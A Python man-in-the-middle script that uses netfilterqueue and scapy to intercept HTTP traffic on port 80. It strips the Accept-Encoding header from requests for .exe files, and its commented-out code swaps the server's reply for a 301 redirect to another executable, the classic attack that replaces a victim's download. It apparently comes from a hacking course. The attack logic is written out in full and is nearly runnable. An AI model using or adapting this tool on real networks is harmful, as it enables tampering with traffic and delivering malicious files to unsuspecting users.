import netfilterqueue
import scapy.all as scapy
import re

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # print(scapy.IP(packet.get_payload()))
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # print(scapy_packet[scapy.Raw].show())
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:
                modified_load = re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
            #     print("exe request")
            #     ack_list.append(scapy_packet[scapy.TCP].ack)  
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            # if scapy_packet[scapy.TCP].seq in ack_list:
                # ack_list.remove(scapy_packet[scapy.TCP].seq)
                # print("Replacing file")
                # scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-700b1ar.exe\n\n"
                
                # packet.set_payload(bytes(scapy_packet))
            print(scapy_packet.show())
    packet.accept()
    

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()